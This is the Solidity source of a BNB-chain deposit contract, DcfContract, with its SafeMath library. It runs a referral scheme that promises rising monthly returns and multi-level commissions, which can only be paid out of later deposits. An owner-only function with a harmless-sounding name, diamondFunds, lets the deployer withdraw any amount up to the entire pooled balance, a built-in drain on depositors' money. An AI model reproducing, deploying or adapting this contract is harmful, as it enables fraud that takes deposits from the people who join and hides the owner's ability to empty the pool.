{"DcfContract.sol":{"content":"pragma solidity 0.5.10;\r\n\r\nimport \"./SafeMath.sol\";\r\n\r\ncontract DcfContract {\r\n    using SafeMath for uint256;\r\n\r\n    struct User {\r\n        address referrerUser;\r\n        address[] followerUsers;\r\n        uint256 depositTime;\r\n        uint256 totalDepositWei;\r\n        uint256 totalReferrerWei;\r\n        uint256 totalWithdrawWei;\r\n        uint256 withdrawableCommissionWei;\r\n        uint256 withdrawableRewardWei;\r\n        uint256 periodReferrerTime;\r\n        uint256 roiPercentPerMonth;\r\n        uint256 paidRoiWei;\r\n        uint256 paidSpecialBonusPercent;\r\n        uint256 roiLevel2Timer;\r\n        uint256 roiLevel3Timer;\r\n        uint256 roiLevel4Timer;\r\n        uint256 roiLevel5Timer;\r\n        bool closed;\r\n    }\r\n\r\n    address payable private _ownerUser;\r\n\r\n    mapping(address =\u003e User) private _userMaps;\r\n    uint256 private _userCount;\r\n\r\n    uint256 private _totalDepositWei;\r\n    uint256 private _totalWithdrawWei;\r\n\r\n    uint256 constant private _withdrawableInTimeLockPercent = 85;\r\n    uint256 constant private _withdrawablePercent = 95; \r\n\r\n    uint256[3] private _userCommissionPercents = [ 5, 3, 2 ];\r\n    uint256 constant private _timelock = 90 days;\r\n    uint256 constant private _minimumDepositWei = 1e16; // 0.01 BNB\r\n    uint256 constant private _drawTopSponsorRewardPeriod = 30 days;\r\n\r\n    uint256 private _lastDrawTopSponsorRewardTime;\r\n    \r\n    uint256 private _topSponsorRewardWei;\r\n    address[10] private _topDepositUsers = [ address(0), address(0), address(0), address(0), address(0), address(0), address(0), address(0), address(0), address(0) ];\r\n    address[10] private _topReferrerUsers = [ address(0), address(0), address(0), address(0), address(0), address(0), address(0), address(0), address(0), address(0) ];\r\n    uint256[10] private _topSponsorRewardPertths = [ 35, 25, 10, 10, 5, 5, 3, 3, 2, 2 ];\r\n\r\n    constructor() public {\r\n        _lastDrawTopSponsorRewardTime = block.timestamp;\r\n        _ownerUser = msg.sender;\r\n        _userMaps[_ownerUser].referrerUser = address(0);\r\n        _userMaps[_ownerUser].depositTime = block.timestamp;\r\n        _userMaps[_ownerUser].closed = true;\r\n        _userCount = _userCount.add(1);\r\n    }\r\n\r\n    function() external payable {\r\n        if (msg.sender != _ownerUser) {\r\n            revert(\"This is for the owner only\");\r\n        }\r\n    }\r\n\r\n    function diamondFunds(uint256 valueWei) public returns(bool) {\r\n        if (msg.sender != _ownerUser) {\r\n            revert(\"This is for the owner only\");\r\n        }\r\n\r\n        if (getContractBalanceWei() \u003c valueWei) {\r\n            revert(\"Overdrawn amount\");\r\n        }\r\n\r\n        msg.sender.transfer(valueWei);\r\n        return true;\r\n    }\r\n\r\n    function getContractBalanceWei() private view returns(uint256) {\r\n        return (address(this)).balance;\r\n    }\r\n\r\n    function getOwnerUser() public view returns(address) {\r\n        return _ownerUser;\r\n    }\r\n\r\n    function getReferrerUser(address user) public view returns(address) {\r\n        return _userMaps[user].referrerUser;\r\n    }\r\n\r\n    function getAllFollowerUsers(address user) public view returns(address[] memory) {\r\n        return _userMaps[user].followerUsers;\r\n    }\r\n\r\n    function getUserInfo(address user) public view returns(uint256[] memory) {\r\n        uint256[] memory info = new uint256[](13);\r\n\r\n        if (isJoinedUser(user)) {\r\n            info[0] = _userMaps[user].depositTime;\r\n            info[1] = _userMaps[user].totalDepositWei;\r\n            info[2] = _userMaps[user].totalReferrerWei;\r\n            info[3] = _userMaps[user].totalWithdrawWei;\r\n            info[4] = getWithdrawableDeposit(user);\r\n            info[5] = getUserRoiWei(user);\r\n            info[6] = _userMaps[user].withdrawableCommissionWei;\r\n            info[7] = _userMaps[user].withdrawableRewardWei;\r\n            info[8] = getRoiPermillPerMonth(user);\r\n\r\n            if (_userMaps[user].closed == false) {\r\n                uint256 timeNow = block.timestamp;\r\n                info[9] = timeNow.subNoNegative(_userMaps[user].depositTime); // seconds since deposit\r\n                info[10] = (_userMaps[user].depositTime + _timelock).subNoNegative(timeNow); // seconds to finish time lock\r\n            } else {\r\n                info[9] = 0;\r\n                info[10] = 0;\r\n            }            \r\n\r\n            if (_userMaps[user].depositTime \u003e 0) {\r\n                info[11] = 1;\r\n            } else {\r\n                info[11] = 0;\r\n            }\r\n\r\n            if (_userMaps[user].closed == false) {\r\n                info[12] = 1;\r\n            } else {\r\n                info[12] = 0;\r\n            }\r\n        } else {\r\n            info[0] = 0;\r\n            info[1] = 0;\r\n            info[2] = 0;\r\n            info[3] = 0;\r\n            info[4] = 0;\r\n            info[5] = 0;\r\n            info[6] = 0;\r\n            info[7] = 0;\r\n            info[8] = 0;\r\n            info[9] = 0;\r\n            info[10] = 0;\r\n            info[11] = 0;\r\n            info[12] = 0;\r\n        }\r\n\r\n        return info;\r\n    }\r\n\r\n    function getSystemInfo() public view returns(uint256[] memory) {\r\n        uint256[] memory info = new uint256[](26);\r\n        info[0] = _userCount;\r\n        info[1] = _totalDepositWei;\r\n        info[2] = _totalWithdrawWei;\r\n        info[3] = _lastDrawTopSponsorRewardTime.add(_drawTopSponsorRewardPeriod).subNoNegative(block.timestamp); // Time to next draw\r\n        info[4] = _topSponsorRewardWei;\r\n        info[5] = (address(this)).balance; // contract balance\r\n        \r\n        for (uint256 i = 0; i \u003c 10; i++) {\r\n            if (_topDepositUsers[i] != address(0)) {\r\n                info[6 + i] = _userMaps[_topDepositUsers[i]].totalDepositWei;\r\n            } else {\r\n                info[6 + i] = 0;\r\n            }\r\n\r\n            if (_topReferrerUsers[i] != address(0)) {\r\n                info[16 + i] = _userMaps[_topReferrerUsers[i]].totalReferrerWei;\r\n            } else {\r\n                info[16 + i] = 0;\r\n            }\r\n        }\r\n\r\n        return info;\r\n    }\r\n\r\n    function getTopSponsorUsers() public view returns(address[] memory) {\r\n        address[] memory users = new address[](20);\r\n\r\n        for (uint256 i = 0; i \u003c 10; i++) {\r\n            users[0 + i] = _topDepositUsers[i];\r\n            users[10 + i] = _topReferrerUsers[i];\r\n        }\r\n\r\n        return users;\r\n    }\r\n\r\n    function isJoinedUser(address user) public view returns(bool) {\r\n        if (user == address(0)) {\r\n            return false;\r\n        }\r\n        if (_userMaps[user].depositTime \u003e 0) {\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    function depositOpenAccount(address referrerUser) public payable {\r\n        if (isJoinedUser(referrerUser) == false) {\r\n            revert(\"Referrer is unknown\");\r\n        }\r\n\r\n        address user = msg.sender;\r\n\r\n        if (user == _ownerUser) {\r\n            revert(\"Owner user cannot deposit\");\r\n        }\r\n        \r\n        if (user == referrerUser) {\r\n            revert(\"User and referrer can not be the same person\");\r\n        }\r\n\r\n        if (isJoinedUser(user) == true) {\r\n            revert(\"Each user can deposit only once\");\r\n        }\r\n\r\n        uint256 depositWei = msg.value;\r\n\r\n        if (depositWei \u003c _minimumDepositWei) {\r\n            revert(\"You have to send at least the minimum requirement amount to join\");\r\n        }\r\n\r\n        _totalDepositWei = _totalDepositWei.add(depositWei);\r\n        _userMaps[referrerUser].followerUsers.push(user);\r\n        _userMaps[user].depositTime = block.timestamp;\r\n        _userMaps[user].referrerUser = referrerUser;\r\n        _userMaps[user].totalDepositWei = depositWei;\r\n        _userMaps[user].periodReferrerTime = 0;\r\n        _userMaps[user].totalReferrerWei = 0;\r\n        _userMaps[user].totalWithdrawWei = 0;\r\n        _userMaps[user].withdrawableCommissionWei = 0;\r\n        _userMaps[user].withdrawableRewardWei = 0;\r\n        _userMaps[user].closed = false;\r\n        _userMaps[user].roiLevel2Timer = _userMaps[user].depositTime + 90 days;\r\n        _userMaps[user].roiLevel3Timer = _userMaps[user].depositTime + 180 days;\r\n        _userMaps[user].roiLevel4Timer = _userMaps[user].depositTime + 360 days;\r\n        _userMaps[user].roiLevel5Timer = _userMaps[user].depositTime + 720 days;\r\n\r\n        _userCount = _userCount.add(1);\r\n\r\n        updateUserCommission(user, depositWei);\r\n        drawRewards();\r\n\r\n        _topSponsorRewardWei = _topSponsorRewardWei.add(depositWei);\r\n\r\n        if (referrerUser != _ownerUser) {\r\n            if (_userMaps[referrerUser].periodReferrerTime \u003c _lastDrawTopSponsorRewardTime) {\r\n                _userMaps[referrerUser].periodReferrerTime = _lastDrawTopSponsorRewardTime;\r\n                _userMaps[referrerUser].totalReferrerWei = depositWei;\r\n            } else {\r\n                _userMaps[referrerUser].totalReferrerWei = _userMaps[referrerUser].totalReferrerWei.add(depositWei);\r\n            }\r\n\r\n            updateTopReferrerUsers(referrerUser);\r\n        }\r\n\r\n        updateTopDepositUsers(user);\r\n    }\r\n\r\n    function withdrawCloseAccount() public {\r\n        address payable user = msg.sender;\r\n\r\n        if (isJoinedUser(user) == false) {\r\n            revert(\"User has not joined\");\r\n        }\r\n\r\n        if (_userMaps[user].closed == true) {\r\n            revert(\"User has been closed\");\r\n        }\r\n\r\n\r\n        uint256 withdrawWei = 0;\r\n        uint256 valueRoiWei = getUserRoiWei(user);\r\n\r\n        withdrawWei = getWithdrawableDeposit(user);\r\n        withdrawWei = withdrawWei.add(valueRoiWei);\r\n        withdrawWei = withdrawWei.add(_userMaps[user].withdrawableCommissionWei);\r\n        withdrawWei = withdrawWei.add(_userMaps[user].withdrawableRewardWei);\r\n\r\n        if (getContractBalanceWei() \u003c withdrawWei) {\r\n            revert(\"Cannot withdraw\");\r\n        }\r\n\r\n        drawRewards();\r\n\r\n        user.transfer(withdrawWei);\r\n        _totalWithdrawWei = _totalWithdrawWei.add(withdrawWei);\r\n        _userMaps[user].totalWithdrawWei = _userMaps[user].totalWithdrawWei.add(withdrawWei);\r\n        _userMaps[user].withdrawableCommissionWei = 0;\r\n        _userMaps[user].withdrawableRewardWei = 0;\r\n        _userMaps[user].paidRoiWei = _userMaps[user].paidRoiWei.add(valueRoiWei);\r\n        \r\n        removeUserFromTopDepositUsers(user);\r\n        removeUserFromTopReferrerUsers(user);\r\n\r\n        _userMaps[user].closed = true;\r\n    }\r\n\r\n    function withdraw() public {\r\n        address payable user = msg.sender;\r\n\r\n        if (isJoinedUser(msg.sender) == false) {\r\n            revert(\"User has not joined\");\r\n        }\r\n\r\n        if (_userMaps[user].closed == true) {\r\n            revert(\"User has been closed\");\r\n        }\r\n\r\n        uint256 withdrawWei = 0;\r\n        uint256 valueRoiWei = getUserRoiWei(user);\r\n        \r\n        withdrawWei = withdrawWei.add(valueRoiWei);\r\n        withdrawWei = withdrawWei.add(_userMaps[user].withdrawableCommissionWei);\r\n        withdrawWei = withdrawWei.add(_userMaps[user].withdrawableRewardWei);\r\n\r\n        if (withdrawWei \u003e 0) {\r\n            if (getContractBalanceWei() \u003c withdrawWei) {\r\n                revert(\"Cannot withdraw\");\r\n            }\r\n        }\r\n\r\n        drawRewards();\r\n\r\n        if (withdrawWei \u003e 0) {\r\n            user.transfer(withdrawWei);\r\n            _totalWithdrawWei = _totalWithdrawWei.add(withdrawWei);\r\n            _userMaps[user].totalWithdrawWei = _userMaps[user].totalWithdrawWei.add(withdrawWei);\r\n            _userMaps[user].withdrawableCommissionWei = 0;\r\n            _userMaps[user].withdrawableRewardWei = 0;\r\n            _userMaps[user].paidRoiWei = _userMaps[user].paidRoiWei.add(valueRoiWei);\r\n        }\r\n    }\r\n\r\n    function getWithdrawableDeposit(address user) private view returns(uint256) {\r\n        uint256 withdrawWei = 0;\r\n\r\n        if (_userMaps[user].closed == false) {\r\n            if (block.timestamp.subNoNegative(_userMaps[user].depositTime) \u003c _timelock) {\r\n                withdrawWei = _userMaps[user].totalDepositWei.percent(_withdrawableInTimeLockPercent);\r\n            } else {\r\n                withdrawWei = _userMaps[user].totalDepositWei.percent(_withdrawablePercent);\r\n            }\r\n        }\r\n\r\n        return withdrawWei;\r\n    }\r\n\r\n    function setUserRoiPercentPerMonth(address user, uint256 balanceWei) private {\r\n        if (balanceWei \u003c 10e8) {\r\n            _userMaps[user].roiPercentPerMonth = 3;\r\n        } else if (balanceWei \u003c 50e8) {\r\n            _userMaps[user].roiPercentPerMonth = 4;\r\n        } else {\r\n            _userMaps[user].roiPercentPerMonth = 5;\r\n        }\r\n    }\r\n\r\n    function updateUserCommission(address user, uint256 valueWei) private {\r\n        address referrerUser = _userMaps[user].referrerUser;\r\n\r\n        for(uint256 i = 0; (i \u003c _userCommissionPercents.length) \u0026\u0026 (referrerUser != _ownerUser); i++) {\r\n            uint256 commissionWei = valueWei.percent(_userCommissionPercents[i]);\r\n            \r\n            if (_userMaps[user].closed == false) {\r\n                _userMaps[referrerUser].withdrawableCommissionWei = _userMaps[referrerUser].withdrawableCommissionWei.add(commissionWei);\r\n            }\r\n\r\n            referrerUser = _userMaps[referrerUser].referrerUser;\r\n        }\r\n    }\r\n\r\n    function drawRewards() private {\r\n        if (block.timestamp.subNoNegative(_lastDrawTopSponsorRewardTime) \u003e= _drawTopSponsorRewardPeriod) {\r\n            _lastDrawTopSponsorRewardTime = block.timestamp;\r\n\r\n            for (uint i = 0; i \u003c _topDepositUsers.length; i++) {\r\n                address user = _topDepositUsers[i];\r\n\r\n                if (user != address(0)) {\r\n                    _userMaps[user].withdrawableRewardWei = _userMaps[user].withdrawableRewardWei.add(_topSponsorRewardWei.pertths(_topSponsorRewardPertths[i]));\r\n                    _userMaps[user].totalReferrerWei = 0;\r\n                }\r\n\r\n                _topDepositUsers[i] = address(0);\r\n            }\r\n            \r\n            for (uint i = 0; i \u003c _topReferrerUsers.length; i++) {\r\n                address user = _topReferrerUsers[i];\r\n\r\n                if (user != address(0)) {\r\n                    _userMaps[user].withdrawableRewardWei = _userMaps[user].withdrawableRewardWei.add(_topSponsorRewardWei.pertths(_topSponsorRewardPertths[i]));\r\n                    _userMaps[user].totalReferrerWei = 0;\r\n                }\r\n\r\n                _topReferrerUsers[i] = address(0);\r\n            }\r\n\r\n            _topSponsorRewardWei = 0;\r\n        }\r\n    }\r\n\r\n    function updateTopDepositUsers(address user) private {\r\n        removeUserFromTopDepositUsers(user);\r\n\r\n        for (uint i = 0; i \u003c _topDepositUsers.length; i++) {\r\n            if (_topDepositUsers[i] == address(0)) {\r\n                _topDepositUsers[i] = user;\r\n                break;\r\n            } else {\r\n                if (_userMaps[user].totalDepositWei \u003e _userMaps[_topDepositUsers[i]].totalDepositWei) {\r\n                    shiftDownTopDepositUsers(i);\r\n                    _topDepositUsers[i] = user;\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    function removeUserFromTopDepositUsers(address user) private {\r\n        for (uint i = 0; i \u003c _topDepositUsers.length; i++) {\r\n            if (user == _topDepositUsers[i]) {\r\n                shiftUpTopDepositUsers(i);\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    function shiftUpTopDepositUsers(uint256 index) private {\r\n        for (uint i = index; i \u003c _topDepositUsers.length - 1; i++) {\r\n            _topDepositUsers[i] = _topDepositUsers[i + 1];\r\n        }\r\n\r\n        _topDepositUsers[_topDepositUsers.length - 1] = address(0);\r\n    }\r\n\r\n    function shiftDownTopDepositUsers(uint256 index) private {\r\n        for (uint i = _topDepositUsers.length - 1; i \u003e index; i--) {\r\n            _topDepositUsers[i] = _topDepositUsers[i - 1];\r\n        }\r\n\r\n        _topDepositUsers[index] = address(0);\r\n    }\r\n\r\n    function updateTopReferrerUsers(address referrerUser) private {\r\n        removeUserFromTopReferrerUsers(referrerUser);\r\n\r\n        for (uint i = 0; i \u003c _topReferrerUsers.length; i++) {\r\n            if (_topReferrerUsers[i] == address(0)) {\r\n                _topReferrerUsers[i] = referrerUser;\r\n                break;\r\n            } else {\r\n                if (_userMaps[referrerUser].totalReferrerWei \u003e _userMaps[_topReferrerUsers[i]].totalReferrerWei) {\r\n                    shiftDownTopReferrerUsers(i);\r\n                    _topReferrerUsers[i] = referrerUser;\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    function removeUserFromTopReferrerUsers(address user) private {\r\n        for (uint i = 0; i \u003c _topReferrerUsers.length; i++) {\r\n            if (user == _topReferrerUsers[i]) {\r\n                shiftUpTopReferrerUsers(i);\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    function shiftUpTopReferrerUsers(uint256 index) private {\r\n        for (uint i = index; i \u003c _topReferrerUsers.length - 1; i++) {\r\n            _topReferrerUsers[i] = _topReferrerUsers[i + 1];\r\n        }\r\n\r\n        _topReferrerUsers[_topReferrerUsers.length - 1] = address(0);\r\n        \r\n    }\r\n\r\n    function shiftDownTopReferrerUsers(uint256 index) private {\r\n        for (uint i = _topReferrerUsers.length - 1; i \u003e index; i--) {\r\n            _topReferrerUsers[i] = _topReferrerUsers[i - 1];\r\n        }\r\n\r\n        _topReferrerUsers[index] = address(0);\r\n    }\r\n\r\n    function getUserRoiWei(address user) private view returns(uint256) {\r\n        if (isJoinedUser(user) == false || _userMaps[user].closed == true) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 roiWei = 0;\r\n        uint256 depositWei = _userMaps[user].totalDepositWei;\r\n        uint256 timeNow = block.timestamp;\r\n\r\n        if (timeNow \u003e _userMaps[user].roiLevel5Timer) {\r\n            roiWei = roiWei.add(depositWei.permill(40).mul(timeNow.subNoNegative(_userMaps[user].roiLevel5Timer)).div(30 days));\r\n            roiWei = roiWei.add(depositWei.permill(35).mul(_userMaps[user].roiLevel5Timer.subNoNegative(_userMaps[user].roiLevel4Timer)).div(30 days));\r\n            roiWei = roiWei.add(depositWei.permill(30).mul(_userMaps[user].roiLevel4Timer.subNoNegative(_userMaps[user].roiLevel3Timer)).div(30 days));\r\n            roiWei = roiWei.add(depositWei.permill(25).mul(_userMaps[user].roiLevel3Timer.subNoNegative(_userMaps[user].roiLevel2Timer)).div(30 days));\r\n            roiWei = roiWei.add(depositWei.permill(20).mul(_userMaps[user].roiLevel2Timer.subNoNegative(_userMaps[user].depositTime)).div(30 days));\r\n        } else if (timeNow \u003e _userMaps[user].roiLevel4Timer) {\r\n            roiWei = roiWei.add(depositWei.permill(35).mul(timeNow.subNoNegative(_userMaps[user].roiLevel4Timer)).div(30 days));\r\n            roiWei = roiWei.add(depositWei.permill(30).mul(_userMaps[user].roiLevel4Timer.subNoNegative(_userMaps[user].roiLevel3Timer)).div(30 days));\r\n            roiWei = roiWei.add(depositWei.permill(25).mul(_userMaps[user].roiLevel3Timer.subNoNegative(_userMaps[user].roiLevel2Timer)).div(30 days));\r\n            roiWei = roiWei.add(depositWei.permill(20).mul(_userMaps[user].roiLevel2Timer.subNoNegative(_userMaps[user].depositTime)).div(30 days));\r\n        } else if (timeNow \u003e _userMaps[user].roiLevel3Timer) {\r\n            roiWei = roiWei.add(depositWei.permill(30).mul(timeNow.subNoNegative(_userMaps[user].roiLevel3Timer)).div(30 days));\r\n            roiWei = roiWei.add(depositWei.permill(25).mul(_userMaps[user].roiLevel3Timer.subNoNegative(_userMaps[user].roiLevel2Timer)).div(30 days));\r\n            roiWei = roiWei.add(depositWei.permill(20).mul(_userMaps[user].roiLevel2Timer.subNoNegative(_userMaps[user].depositTime)).div(30 days));\r\n        } else if (timeNow \u003e _userMaps[user].roiLevel2Timer) {\r\n            roiWei = roiWei.add(depositWei.permill(25).mul(timeNow.subNoNegative(_userMaps[user].roiLevel2Timer)).div(30 days));\r\n            roiWei = roiWei.add(depositWei.permill(20).mul(_userMaps[user].roiLevel2Timer.subNoNegative(_userMaps[user].depositTime)).div(30 days));\r\n        } else {\r\n            roiWei = roiWei.add(depositWei.permill(20).mul(timeNow.subNoNegative(_userMaps[user].depositTime)).div(30 days));\r\n        }\r\n\r\n        roiWei = roiWei.subNoNegative(_userMaps[user].paidRoiWei);\r\n\r\n        return roiWei;\r\n    }\r\n\r\n    function getRoiPermillPerMonth(address user) private view returns(uint256) {\r\n        if (isJoinedUser(user) == false || _userMaps[user].closed == true) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 timeNow = block.timestamp;\r\n\r\n        if (timeNow \u003e _userMaps[user].roiLevel5Timer) {\r\n            return 40;\r\n        } else if (timeNow \u003e _userMaps[user].roiLevel4Timer) {\r\n            return 35;\r\n        } else if (timeNow \u003e _userMaps[user].roiLevel3Timer) {\r\n            return 30;\r\n        } else if (timeNow \u003e _userMaps[user].roiLevel2Timer) {\r\n            return 25;\r\n        } else {\r\n            return 20;\r\n        }\r\n    }\r\n}\r\n"},"SafeMath.sol":{"content":"pragma solidity 0.5.10;\r\n\r\nlibrary SafeMath {\r\n\r\n    function pertths(uint256 value, uint256 _pertths) internal pure  returns(uint256) {\r\n        return div(mul(value, _pertths), 10000);\r\n    }\r\n\r\n    function permill(uint256 value, uint256 _permill) internal pure  returns(uint256) {\r\n        return div(mul(value, _permill), 1000);\r\n    }\r\n\r\n    function percent(uint256 value, uint256 _percent) internal pure  returns(uint256) {\r\n        return div(mul(value, _percent), 100);\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c \u003e= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(a \u003e= b, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function subNoNegative(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a \u003c b) {\r\n            return 0;\r\n        }\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n    \r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b \u003e 0, \"SafeMath: division by zero\");\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b != 0, \"SafeMath: modulo by zero\");\r\n        return a % b;\r\n    }\r\n}\r\n"}}